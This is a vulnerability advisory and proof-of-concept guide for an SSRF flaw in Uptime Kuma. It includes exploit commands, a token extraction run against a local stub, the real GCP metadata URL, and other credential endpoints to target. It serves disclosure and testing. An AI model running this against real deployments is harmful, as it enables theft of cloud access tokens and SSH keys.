# GHSA-qjxc-h5jf-c7rj: SSRF via HTTP(s) Keyword monitor

Uptime Kuma lets any logged-in user point a monitor at any URL. Nothing filters
loopback, link-local or RFC1918 targets, and custom request headers are passed
straight through. That is enough to talk to a cloud metadata service from
inside the box Kuma runs on.

The interesting part is not the request. It's that the keyword monitor hands
you the response back.

Checked against `main` @ b9806216 (2026-08-13), v2.5.0. Still unpatched.

## Where it breaks

`server/model/monitor.js:568`, attacker headers merged into the outbound
request:

```js
headers: {
    "Accept": "*/*",
    ...
    ...(this.headers ? JSON.parse(this.headers) : {}),
```

So `Metadata-Flavor: Google` (or `X-aws-ec2-metadata-token`, or Azure's
`Metadata: true`) is one text field away. There is no URL validation before
this. Grep the tree for `169.254`, `ssrf`, `isPrivateIP`: nothing.

`server/model/monitor.js:691`, the read primitive:

```js
let keywordFound = data.includes(this.keyword);
if (keywordFound === !this.isInvertKeyword()) {
    bean.msg += ", keyword " + (keywordFound ? "is" : "not") + " found";
    bean.status = UP;
} else {
    data = data.replace(/<[^>]*>?|[\n\r]|\s+/gm, " ").trim();
    if (data.length > 50) {
        data = data.substring(0, 47) + "...";
    }
    throw new Error(bean.msg + ", but keyword is " + ... + " in [" + data + "]");
}
```

Two things fall out of that:

1. **Direct leak.** Search for a keyword that cannot be there, monitor goes
   DOWN, and the failure message embeds the first 47 bytes of the response
   body. Written to the heartbeat row and pushed over the socket. No blind
   guessing needed for the head of the document.
2. **Boolean oracle.** `data.includes(keyword)` with UP/DOWN as the answer is a
   substring test on the response. Extend a prefix one character at a time and
   you pull out the whole body, past the 47-byte window. Works for the parts of
   a GCP access token that the truncation hides.

`editMonitor` calls `restartMonitor`, which fires a beat immediately, so the
oracle runs at the speed of the target's HTTP response, not at the monitor
interval.

One thing that will bite you if you write this yourself: the beat from the
previous keyword can still be in flight when you push the next one. Read it and
the oracle answers the wrong question, silently, and you extract garbage. The
script waits for the socket to go quiet before each edit (`--settle`), and
keeps one beat queue per monitor id so parallel probes don't read each other's
answers.

## Files

- `metadata_stub.py` stands in for the GCP metadata server so you can run
  this on a laptop instead of burning a real instance token.
- `exploit.py` logs in over socket.io, drives the monitors, prints the token.

## Running it

Layout this assumes:

```
.
├── poc/            # this directory
└── uptime-kuma/    # git clone https://github.com/louislam/uptime-kuma.git
```

Terminal 1, Uptime Kuma:

```
cd uptime-kuma
npm install
printf '{"type":"sqlite"}' > data/db-config.json   # skips the DB wizard
NODE_ENV=development node server/server.js         # skips the dist/index.html check
```

Give the migrations a couple of minutes on first boot. Then do the signup at
http://localhost:3001 (the PoC needs credentials, that's the "authenticated"
in the advisory). `NODE_ENV=development` is only so you don't have to run the
frontend build; the socket API is the same either way.

Terminal 2, the fake metadata service:

```
python3 poc/metadata_stub.py
```

It binds 127.0.0.1:8169 and refuses anything without `Metadata-Flavor: Google`,
same as the real one. The token it serves is 243 characters, which is about
what GCP hands out.

Terminal 3:

```
pip install 'python-socketio[client]>=5'    # 4.x speaks the wrong protocol, connect just fails
python3 poc/exploit.py -u admin -p yourpassword -w 8 --settle 0.4 \
    --charset 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_."'
```

Actual run against 2.5.0 (`main` @ b9806216):

```
[+] logged in as admin
[+] 8 monitor(s) created (8, 9, 10, 11, 12, 13, 14, 15) -> http://127.0.0.1:8169/computeMetadata/v1/instance/service-accounts/default/token
[+] header leak: {"access_token":"ya29.c.b0Aaekm1L9xqZ7vN3rKpQ8s...
[*] seeding from the leak, extracting past the 47-byte cutoff
[  1] 'T'      48 probes    4.1s  ...access_token":"ya29.c.b0Aaekm1L9xqZ7vN3rKpQ8sT
[ 46] 'D'    1864 probes  130.9s  ...T2uW5yA1bC4dE6fG8hJ0kL2mN4pQ6rS8tU0vW2xY4zA6bD
[106] 'K'    4280 probes  289.5s  ...X8zB1dF3hJ5lN7pR9tV1xZ3bE5gJ7kM9qS2uW4yA6cF8hK
[176] '9'    7144 probes  473.2s  ...7wZ9bD2fH4jM6pS8vX0zC3eH5kN7qT9wA1dG3jL5nR7tV9
[213] 'a'    8600 probes  571.6s  ...jL5nR7tV9yB2eG4iK6mP8sU0xA2cE4gI6kM8oQ0sU2wY4a
[+] recovered 260 bytes:
{"access_token":"ya29.c.b0Aaekm1L9xqZ7vN3rKpQ8sT2uW5yA1bC4dE6fG8hJ0kL2mN4pQ6rS8tU0vW2xY4zA6bD8fH0jK2mP4rT6vX8zB1dF3hJ5lN7pR9tV1xZ3bE5gJ7kM9qS2uW4yA6cF8hK0mQ2sU4wY6aC9eG1iL3nQ5rU7wZ9bD2fH4jM6pS8vX0zC3eH5kN7qT9wA1dG3jL5nR7tV9yB2eG4iK6mP8sU0xA2cE4gI6kM8oQ0sU2wY4a
[+] monitors removed
```

Whole token, byte-identical to what the stub serves. 9m32s, 8600 probes across
8 monitors. Only the first 47 bytes came from the error message; the other 196
characters came out of the oracle.

Cost is roughly `len(charset)/2` probes per unknown byte. Seeding from the leak
kills the first 47 for free. `-w` sets how many monitors probe in parallel and
the wall clock scales with it more or less linearly, since the candidates for one
position are independent questions. Narrowing `--charset` to what you expect
does the rest.

On a real GCP box, swap `--target` for
`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
and keep the default header.

Other endpoints worth pointing it at:

```
/computeMetadata/v1/project/project-id
/computeMetadata/v1/instance/attributes/ssh-keys
/computeMetadata/v1/instance/attributes/startup-script
```

`--leak-only` skips the oracle and just prints the 47-byte window, which for
short responses is the whole thing:

```
$ python3 poc/exploit.py -u admin -p yourpassword --leak-only \
    --target http://127.0.0.1:8169/computeMetadata/v1/instance/attributes/ssh-keys
[+] header leak: deploy:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC ...
```

AWS IMDSv2 needs the PUT to `/latest/api/token` first, which the keyword
monitor can do (`--method PUT`), but you have to carry the token across two
monitors by hand. IMDSv1 hosts are a single request.

## Notes

The maintainer's position is that this is the deployment's problem, not the
app's, and the advisory ships firewall / NetworkPolicy guidance instead of a
patch. Fair enough as far as it goes, but the response-body echo in the DOWN
message is what turns "can send a request" into "can read the answer", and that
part is squarely application-side. A monitor that reported only match/no-match
and never inlined body bytes would still be a useful monitor.

Rate limiting the keyword edits, or not restarting the monitor on every edit,
would also take the oracle from ten minutes to a week. 8600 monitor edits and
8600 requests to a link-local address in ten minutes currently produce no
signal anywhere except a monitor that looks like it's flapping.
